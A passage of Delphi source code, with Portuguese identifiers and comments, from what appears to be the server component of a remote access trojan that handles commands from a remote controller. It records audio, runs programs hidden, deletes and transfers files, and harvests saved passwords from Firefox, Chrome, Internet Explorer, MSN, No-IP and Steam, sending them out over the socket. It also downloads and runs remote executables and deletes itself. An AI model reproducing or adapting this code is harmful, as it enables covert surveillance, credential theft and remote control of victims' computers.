      FecharJanela(WebcamWindow);
    end;
    sleep(1000);
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = AUDIOGETBUFFER then
  begin
    if AudioThreadId <> 0 then
    begin
      try
        FinalizarAudio;
        CloseThread(AudioThreadId);
        except
      end;
      AudioThreadId := 0;
    end;
    Delete(Comando, 1, pos('|', Comando));
    tempstr1 := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));
    tempstr2 := copy(Comando, 1, pos('|', Comando) - 1);
    begin
      ZeroMemory(@ThreadInfoAudio, sizeof(TThreadInfoAudio));
      ThreadInfoAudio.Password := senha;
      ThreadInfoAudio.host := ClientSocket.RemoteAddress;
      ThreadInfoAudio.port := ClientSocket.RemotePort;
      ThreadInfoAudio.IdentificacaoNoCliente := RandomStringClient;
      ThreadInfoAudio.Sample := strtoint(Tempstr2);
      ThreadInfoAudio.Channel := strtoint(Tempstr1);

      CarregarVariaveisAudio(ThreadInfoAudio);
      AudioThreadId := CommandThreadId;
      ThreadedTransferAudio(nil);
      while true do processmessages;
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = AUDIOSTOP then
  begin
    if AudioThreadId <> 0 then
    begin
      try
        FinalizarAudio;
        CloseThread(AudioThreadId);
        except
      end;
      AudioThreadId := 0;
    end;
    closethread(CommandThreadId);
  end else

  if Copy(Comando, 1, pos('|', Comando) - 1) = LISTAR_DRIVES then
  begin
    TempStr := GetDrives;
    ToSend := FILEMANAGER + '|' + LISTAR_DRIVES + '|' + TempStr;
    _EnviarStream(ClientSocket, Tosend);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTAR_ARQUIVOS then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    TempStr1 := ListarArquivos(TempStr);
    if TempStr1 = '' then ToSend := FILEMANAGER + '|' + DIRMANAGERERROR + '|' + TempStr + '|' else
      ToSend := FILEMANAGER + '|' + LISTAR_ARQUIVOS + '|' + TempStr1;

    _EnviarStream(ClientSocket, Tosend);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = EXEC_NORMAL then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);

    delete(Comando, 1, pos('|', Comando));
    TempStr2 := copy(Comando, 1, pos('|', Comando) - 1);
    if tempstr2 = ' ' then tempstr2 := '';
    try
      if MyShellExecute(0, 'open', pchar(TempStr1), pchar(tempstr2), nil, SW_NORMAL) <= 32 then
      begin
        ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '318' + '|';
        _EnviarStream(ClientSocket, Tosend);
      end else
      begin
        ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '319' + '|';
        _EnviarStream(ClientSocket, ToSend);
      end;
      except
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '318' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = EXEC_INV then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);

    delete(Comando, 1, pos('|', Comando));
    TempStr2 := copy(Comando, 1, pos('|', Comando) - 1);
    if tempstr2 = ' ' then tempstr2 := '';
    try
      if MyShellExecute(0, 'open', pchar(TempStr1), pchar(tempstr2), nil, SW_HIDE) <= 32 then
      begin
        ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '318' + '|';
        _EnviarStream(ClientSocket, Tosend);
      end else
      begin
        ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '319' + '|';
        _EnviarStream(ClientSocket, ToSend);
      end;
      except
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '318' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DELETAR_DIR then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    if DeleteFolder(pchar(TempStr1)) = true then
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '320' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '321' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DELETAR_ARQ then
  begin
    delete(Comando, 1, pos('|', Comando));
    Tempstr1 := copy(Comando, 1, pos('|', Comando) - 1);
    if MyDeleteFile(pchar(Tempstr1)) = true then
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '320' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '321' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = RENOMEAR_DIR then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));
    TempStr2 := copy(Comando, 1, pos('|', Comando) - 1);
    if MyRenameFile_Dir(TempStr1, TempStr2) = true then
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '--->' + TempStr2 + '|' + '322' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '--->' + TempStr2 + '|' + '323' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = RENOMEAR_ARQ then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));
    TempStr2 := copy(Comando, 1, pos('|', Comando) - 1);
    if MyRenameFile_Dir(TempStr1, TempStr2) = true then
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '--->' + TempStr2 + '|' + '322' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '--->' + TempStr2 + '|' + '323' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = CRIAR_PASTA then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    if CreateDirectory(pchar(TempStr1), nil) = true then
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '324' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + '|' + '325' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESKTOP_PAPER then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr := copy(Comando, 1, pos('|', Comando) - 1);

    SaveAnyImageToBMPFile(TempStr, TempStr1);

    try
      SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pchar(TempStr1), SPIF_SENDCHANGE);
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr + '|' + '326' + '|';
      _EnviarStream(ClientSocket, ToSend);
      except
      begin
        ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr + '|' + '327' + '|';
        _EnviarStream(ClientSocket, ToSend);
      end;
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = COPIAR_ARQ then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    TempStr2 := copy(Comando, 1, pos('|', Comando) - 1);

    if copyfile(pchar(TempStr1 + tempstr), pchar(TempStr2 + tempstr), FALSE) = true then
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + tempstr + '--->' + TempStr2 + tempstr + '|' + '328' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + tempstr + '--->' + TempStr2 + tempstr + '|' + '328' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = COPIAR_PASTA then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    TempStr2 := copy(Comando, 1, pos('|', Comando) - 1);

    if CopyDirectory(0, pchar(TempStr1 + tempstr), pchar(TempStr2)) = true then
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + tempstr + '--->' + TempStr2 + tempstr + '|' + '328' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + MENSAGENS + '|' + TempStr1 + tempstr + '--->' + TempStr2 + tempstr + '|' + '328' + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = THUMBNAIL then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    if fileexists(TempStr1) = false then
    begin
      ToSend := FILEMANAGER + '|' + THUMBNAILERROR + '|';
      _EnviarStream(ClientSocket, Tosend);
      exit;
    end;

    TempStr2 := GetAnyImageToString(TempStr1, 75, 96, 96);

    ToSend := FILEMANAGER + '|' + THUMBNAIL + '|' + TempStr + '|' + TempStr1 + '|' + TempStr2;
    _EnviarStream(ClientSocket, Tosend);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DOWNLOAD then
  begin
    Delete(Comando, 1, pos('|', Comando));
    Tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    TempInt := MyGetFileSize(Tempstr);

    if (fileexists(Tempstr) = true) and (TempInt > 0) and (PossoMexerNoArquivo(Tempstr) = true) then
    EnviarArquivo(ClientSocket, FILEMANAGER + '|' + DOWNLOAD + '|' + TempStr + '|', TempStr, TempInt, 0) else
    _EnviarStream(ClientSocket, FILEMANAGER + '|' + FILEMANAGERERROR + '|' + Tempstr + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DOWNLOADREC then
  begin
    Delete(Comando, 1, pos('|', Comando));
    Tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    TempInt := MyGetFileSize(Tempstr);

    if (fileexists(Tempstr) = true) and (TempInt > 0) and (PossoMexerNoArquivo(Tempstr) = true) then
    EnviarArquivo(ClientSocket, FILEMANAGER + '|' + DOWNLOADREC + '|' + extractfilepath(Tempstr) + '|' + TempStr + '|', TempStr, TempInt, 0) else
    _EnviarStream(ClientSocket, FILEMANAGER + '|' + FILEMANAGERERROR + '|' + Tempstr + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = RESUMETRANSFER then
  begin
    Delete(Comando, 1, pos('|', Comando));

    Tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    TempInt := strtoint(copy(Comando, 1, pos('|', Comando) - 1));

    TempInt2 := MyGetFileSize(Tempstr);

    if (fileexists(Tempstr) = true) and (PossoMexerNoArquivo(Tempstr) = true) then
    EnviarArquivo(ClientSocket, FILEMANAGER + '|' + RESUMETRANSFER + '|' + TempStr + '|', TempStr, TempInt2, TempInt) else
    _EnviarStream(ClientSocket, FILEMANAGER + '|' + FILEMANAGERERROR + '|' + Tempstr + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = UPLOAD then
  begin
    Delete(Comando, 1, Pos('|', Comando));

    TempStr := Copy(Comando, 1, Pos('|', Comando) - 1); // arquivo no cliente
    Delete(Comando, 1, Pos('|', Comando));

    TempStr1 := Copy(Comando, 1, Pos('|', Comando) - 1);  // onde vou salvar
    Delete(Comando, 1, Pos('|', Comando));

    TempStr2 := Copy(Comando, 1, Pos('|', Comando) - 1);  // Tamanho
    Delete(Comando, 1, Pos('|', Comando));

    Criararquivo(TempStr1, 'XXX', 3);
    if MyDeleteFile(TempStr1) = false then
    _EnviarStream(ClientSocket, FILEMANAGER + '|' + FILEMANAGERERROR + '|' + TempStr1 + '|') else
    ReceberArquivo2(ClientSocket, FILEMANAGER + '|' + UPLOAD + '|' + TempStr + '|', TempStr1, strtoint(TempStr2));
 end else

  if copy(Comando, 1, pos('|', Comando) - 1) = PROCURAR_ARQ then
  begin
    ToSendSearch := '';
    if SearchID <> 0 then CloseThread(SearchID);

    delete(Comando, 1, pos('|', Comando));

    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    TempStr2 := copy(Comando, 1, pos('|', Comando) - 1);

    ThreadSearch := TThreadSearch.Create(TempStr1, TempStr2);
    SearchID := BeginThread(nil,
                            0,
                            @ProcurarArquivo,
                            ThreadSearch,
                            0,
                            ThreadId);
    while true do processmessages;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = PROCURAR_ARQ_PARAR then
  begin
    if SearchID <> 0 then CloseThread(SearchID);
    SearchID := 0;

    TempStr := ToSendSearch;
    ToSendSearch := '';

    if TempStr <> '' then
    begin
      ToSend := FILEMANAGER + '|' + PROCURAR_ARQ + '|' + TempStr;
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + PROCURARERROR + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = THUMBNAILSEARCH then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    if fileexists(TempStr1) = false then
    begin
      ToSend := FILEMANAGER + '|' + THUMBNAILSEARCHERROR + '|';
      _EnviarStream(ClientSocket, Tosend);
      exit;
    end;

    TempStr2 := GetAnyImageToString(TempStr1, 75, 96, 96);

    ToSend := FILEMANAGER + '|' + THUMBNAILSEARCH + '|' + TempStr + '|' + TempStr1 + '|' + TempStr2;
    _EnviarStream(ClientSocket, Tosend);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MULTITHUMBNAIL then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempStr3 := '';

    while Comando <> '' do
    begin
      sleep(10);

      TempStr := copy(Comando, 1, pos('|', Comando) - 1);
      Delete(Comando, 1, pos('|', Comando));

      TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
      Delete(Comando, 1, pos('|', Comando));

      if fileexists(TempStr1) = false then Continue;

      TempStr2 := GetAnyImageToString(TempStr1, 75, 96, 96);
      TempStr3 := TempStr3 + TempStr + '|' + TempStr2 + DelimitadorDeImagem;
    end;

    if TempStr3 = '' then
    begin
      ToSend := FILEMANAGER + '|' + THUMBNAILERROR + '|';
      _EnviarStream(ClientSocket, Tosend);
      exit;
    end;

    ToSend := FILEMANAGER + '|' + MULTITHUMBNAIL + '|' + TempStr3;
    _EnviarStream(ClientSocket, Tosend);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MULTITHUMBNAILSEARCH then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempStr3 := '';

    while Comando <> '' do
    begin
      sleep(10);

      TempStr := copy(Comando, 1, pos('|', Comando) - 1);
      Delete(Comando, 1, pos('|', Comando));

      TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
      Delete(Comando, 1, pos('|', Comando));

      if fileexists(TempStr1) = false then Continue;

      TempStr2 := GetAnyImageToString(TempStr1, 75, 96, 96);
      TempStr3 := TempStr3 + TempStr + '|' + TempStr2 + DelimitadorDeImagem; // delimitador
    end;

    if TempStr3 = '' then
    begin
      ToSend := FILEMANAGER + '|' + THUMBNAILSEARCHERROR + '|';
      _EnviarStream(ClientSocket, Tosend);
      exit;
    end;

    ToSend := FILEMANAGER + '|' + MULTITHUMBNAILSEARCH + '|' + TempStr3;
    _EnviarStream(ClientSocket, Tosend);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MULTIDELETAR_DIR then
  begin
    delete(Comando, 1, pos('|', Comando));
    DeletouDir := true;

    while Comando <> '' do
    begin
      TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
      delete(Comando, 1, pos('|', Comando));
      if DeleteFolder(pchar(TempStr1)) = false then DeletouDir := false;
    end;
    if DeletouDir = true then
    begin
      ToSend := FILEMANAGER + '|' + DELDIRALLYES + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + DELDIRALLNO + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MULTIDELETAR_ARQ then
  begin
    delete(Comando, 1, pos('|', Comando));
    DeletouArq := true;

    while Comando <> '' do
    begin
      TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
      delete(Comando, 1, pos('|', Comando));
      if MyDeleteFile(pchar(TempStr1)) = false then DeletouArq := false;
    end;
    if DeletouArq = true then
    begin
      ToSend := FILEMANAGER + '|' + DELFILEALLYES + '|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      ToSend := FILEMANAGER + '|' + DELFILEALLNO + '|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MULTIDOWNLOAD then
  begin
    Delete(Comando, 1, pos('|', Comando));

    while Comando <> '' do
    begin
      Tempstr := copy(Comando, 1, pos('|', Comando) - 1);
      Delete(Comando, 1, pos('|', Comando));

      TempInt := MyGetFileSize(Tempstr);

      if (fileexists(Tempstr) = true) and (TempInt > 0) and (PossoMexerNoArquivo(Tempstr) = true) then
      begin
        MuliDownFile := Tempstr;
        MuliDownFileSize := TempInt;
        StartThread(@DownloadSelected);
        sleep(500);
      end;
    end;
    While true do processmessages;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MULTIDOWNLOADREC then
  begin
    Delete(Comando, 1, pos('|', Comando));

    while Comando <> '' do
    begin
      Tempstr := copy(Comando, 1, pos('|', Comando) - 1);
      Delete(Comando, 1, pos('|', Comando));

      TempInt := MyGetFileSize(Tempstr);

      if (fileexists(Tempstr) = true) and (TempInt > 0) and (PossoMexerNoArquivo(Tempstr) = true) then
      begin
        MuliDownFile := Tempstr;
        MuliDownFileSize := TempInt;
        StartThread(@DownloadRecSelected);
        sleep(500);
      end;
    end;
    While true do processmessages;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = GETPASSWORD then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    if TempStr = ' ' then TempStr := '';
    TempStr3 := NewIdentification + '_' + extractdiskserial(copy(paramstr(0), 1, pos('\', paramstr(0))));

    TempMutex := CreateMutex(nil, False, '_x_X_PASSWORDLIST_X_x_');

    if fileexists(ServerFileName) = true then
    if MyShellExecute(0, 'open', pchar(ServerFileName), nil, nil, SW_NORMAL) <= 32 then exit else
    begin
      sleep(2000);
      closehandle(TempMutex);
      NOIP := lerarquivo(MytempFolder + 'NOIP.abc', c);
      MSN := lerarquivo(MytempFolder + 'MSN.abc', c);
      FIREFOX := lerarquivo(MytempFolder + 'FIREFOX.abc', c);
      IELOGIN := lerarquivo(MytempFolder + 'IELOGIN.abc', c);
      IEPASS := lerarquivo(MytempFolder + 'IEPASS.abc', c);
      IEAUTO := lerarquivo(MytempFolder + 'IEAUTO.abc', c);
      IEWEB := lerarquivo(MytempFolder + 'IEWEB.abc', c);
      TempStr4 := lerreg(HKEY_LOCAL_MACHINE, 'SOFTWARE\Mozilla\Mozilla Firefox', 'CurrentVersion', '');

      TempInt := strtoint(copy(tempstr4, 1, pos('.', Tempstr4) - 1));
      if TempInt >= 3 then
      begin
        delete(tempstr4, 1, pos('.', Tempstr4));
        if TempInt >= 4 then FF3_5 := Mozilla3_5Password else
        if strtoint(copy(tempstr4, 1, 1)) >= 5 then FF3_5 := Mozilla3_5Password else FF3_5 := '';
      end;

      if ChromePassReady = true then CHROME := GetChromePass(ChromeFile) else CHROME := '';
      STEAM := GetSteamPass;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(NOIP)) <> 0 then
        TempStr1 := TempStr1 + GETNOIP + '|' + TempStr3 + '|' + NOIP + DelimitadorDeImagem;
      end else if NOIP <> '' then TempStr1 := TempStr1 + GETNOIP + '|' + TempStr3 + '|' + NOIP + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(MSN)) <> 0 then
        TempStr1 := TempStr1 + GETMSN + '|' + TempStr3 + '|' + MSN + DelimitadorDeImagem else
      end else if MSN <> '' then TempStr1 := TempStr1 + GETMSN + '|' + TempStr3 + '|' + MSN + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(FIREFOX)) <> 0 then
        TempStr1 := TempStr1 + GETFIREFOX + '|' + TempStr3 + '|' + FIREFOX + DelimitadorDeImagem else
      end else if FIREFOX <> '' then TempStr1 := TempStr1 + GETFIREFOX + '|' + TempStr3 + '|' + FIREFOX + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(IELOGIN)) <> 0 then
        TempStr1 := TempStr1 + GETIELOGIN + '|' + TempStr3 + '|' + IELOGIN + DelimitadorDeImagem else
      end else if IELOGIN <> '' then TempStr1 := TempStr1 + GETIELOGIN + '|' + TempStr3 + '|' + IELOGIN + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(IEPASS)) <> 0 then
        TempStr1 := TempStr1 + GETIEPASS + '|' + TempStr3 + '|' + IEPASS + DelimitadorDeImagem else
      end else if IEPASS <> '' then TempStr1 := TempStr1 + GETIEPASS + '|' + TempStr3 + '|' + IEPASS + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(IEAUTO)) <> 0 then
        TempStr1 := TempStr1 + GETIEAUTO + '|' + TempStr3 + '|' + IEAUTO + DelimitadorDeImagem else
      end else if IEAUTO <> '' then TempStr1 := TempStr1 + GETIEAUTO + '|' + TempStr3 + '|' + IEAUTO + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(IEWEB)) <> 0 then
        TempStr1 := TempStr1 + GETIEWEB + '|' + TempStr3 + '|' + IEWEB + DelimitadorDeImagem else
      end else if IEWEB <> '' then TempStr1 := TempStr1 + GETIEWEB + '|' + TempStr3 + '|' + IEWEB + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(FF3_5)) <> 0 then
        TempStr1 := TempStr1 + GETFF3_5 + '|' + TempStr3 + '|' + FF3_5 + DelimitadorDeImagem else
      end else if FF3_5 <> '' then TempStr1 := TempStr1 + GETFF3_5 + '|' + TempStr3 + '|' + FF3_5 + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(STEAM) + 'STEAM') <> 0 then
        TempStr1 := TempStr1 + GETSTEAM + '|' + TempStr3 + '|' + STEAM + DelimitadorDeImagem else
      end else if STEAM <> '' then TempStr1 := TempStr1 + GETSTEAM + '|' + TempStr3 + '|' + STEAM + DelimitadorDeImagem;

      if TempStr <> '' then
      begin
        if pos(Upperstring(TempStr), Upperstring(CHROME)) <> 0 then
        TempStr1 := TempStr1 + GETCHROME + '|' + TempStr3 + '|' + CHROME + DelimitadorDeImagem else
      end else if CHROME <> '' then TempStr1 := TempStr1 + GETCHROME + '|' + TempStr3 + '|' + CHROME + DelimitadorDeImagem;

      //não vou deletar pq algumas vezes o ervidor não consegue criar as senhas em 2 segundos
      // assim eu aproveito as existentes
      //MyDeleteFile(MytempFolder + 'NOIP.abc');
      //MyDeleteFile(MytempFolder + 'MSN.abc');
      //MyDeleteFile(MytempFolder + 'FIREFOX.abc');
      //MyDeleteFile(MytempFolder + 'IELOGIN.abc');
      //MyDeleteFile(MytempFolder + 'IEPASS.abc');
      //MyDeleteFile(MytempFolder + 'IEAUTO.abc');
      //MyDeleteFile(MytempFolder + 'IEWEB.abc');

      if TempStr1 <> '' then
      begin
        ToSend := GETPASSWORD + '|' + GETPASSWORDLIST + '|' + TempStr1;
        //_EnviarStream(ClientSocket, ToSend, true); //tentei criar nova conexão e não deu muito certo
        _EnviarStream(ClientSocket, ToSend); //tentei criar nova conexão e não deu muito certo
      end else
      begin
        ToSend := GETPASSWORD + '|' + GETPASSWORDERROR + '|';
        _EnviarStream(ClientSocket, ToSend);
      end;
    end;
    closehandle(TempMutex);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = UPDATESERVIDORWEB then
  begin
    delete(comando, 1, pos('|', Comando));

    TempStr1 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(comando, 1, pos('|', Comando));

    TempStr2 := MyTempFolder + inttostr(gettickcount) + '_' + ExtractFileName(TempStr1);

    MyURLDownloadToFile(nil, pchar(tempstr1), pchar(tempstr2), 0, nil);

    TempMutex := CreateMutex(nil, False, '_x_X_UPDATE_X_x_');
    if MyShellExecute(0, 'open', pchar(TempStr2), nil, nil, SW_NORMAL) <= 32 then
    begin
      _EnviarStream(ClientSocket, UPDATESERVERERROR + '|');
      exit;
    end;
    sleep(1000);
    CloseHandle(TempMutex);

    DesinstalarServer;

    ClientSocket.Disconnect(erro22);
    AddDebug(erro7);

    GetWindowThreadProcessId(FindWindow('shell_traywnd', nil), @PID);

    if PID <> getcurrentprocessid then
    begin
      if paramstr(0) <> ServerFileName then MyDeleteFile(ServerFileName) else DeletarSe;
      sleep(10000);
    exitprocess(0);
    end else
    begin
      if paramstr(0) <> ServerFileName then MyDeleteFile(ServerFileName) else DeletarSe;
      FinalizarServidor := true;
      sleep(10000); // tempo para todos os processos verificarem o mutex_sair
      // aqui eu preciso fachar o handle pq o processo não será finalizado
      CloseHandle(ExitMutex);
      exit;
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = UnitComandos.FILESEARCH then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    TempStr1 := GetDrives2;

    TempStr2 := '';
    while (Tempstr1 <> '') or (Tempstr2 <> '') do
    begin
      TempStr3 := listararquivos(copy(Tempstr1, 1, pos('|', Tempstr1) - 1));
      if length(TempStr3) > 3 then
      begin
        if FileExistsOnComputer(copy(Tempstr1, 1, pos('|', Tempstr1) - 1), '*' + TempStr + '*.*', true, Tempstr2) = true then break;
        delete(Tempstr1, 1, pos('|', Tempstr1));
      end else delete(Tempstr1, 1, pos('|', Tempstr1));
    end;

    if Tempstr2 <> '' then _EnviarStream(ClientSocket, FILESEARCHOK + '|' + Tempstr2 + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MYMESSAGEBOX then
  begin
    delete(Comando, 1, pos('|', Comando));
    tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));
    tempstr1 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));
    tempstr2 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));
    tempstr3 := copy(Comando, 1, pos('|', Comando) - 1);
    delete(Comando, 1, pos('|', Comando));

    // coloquei esse procedimento para mostrar o messagebox no primeiro handle invisível que ele achar.
    // assim não aparece o ícone quando mostrar o messagebox
    TempStr5 := WindowsList;
    while TempStr5 <> '' do
    begin
      TempStr6 := copy(TempStr5, 1, pos('|', TempStr5) - 1);
      delete(TempStr5, 1, pos('|', TempStr5));
      H := StrToInt(copy(TempStr5, 1, pos('|', TempStr5) - 1));
      delete(TempStr5, 1, pos('|', TempStr5));
      if pos('*@*@', TempStr6) > 0 then
      begin
        i := messagebox(H,
                        pchar(tempstr3),
                        pchar(tempstr2),
                        strtoint(tempstr) or strtoint(tempstr1) or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);

        ToSend := OPCOESEXTRAS + '|' + MYMESSAGEBOX + '|' + inttostr(i) + '|' + ENTER;
        try
